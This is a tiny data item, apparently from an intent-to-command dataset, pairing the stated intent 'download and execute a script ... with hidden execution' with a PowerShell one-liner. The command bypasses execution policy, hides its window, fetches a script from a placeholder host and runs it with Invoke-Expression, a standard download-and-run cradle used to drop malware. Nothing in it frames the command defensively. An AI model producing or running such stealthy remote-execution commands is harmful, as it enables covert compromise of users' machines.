# Natural language intent:
# Download and execute a script from a specified website with hidden execution using PowerShell.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
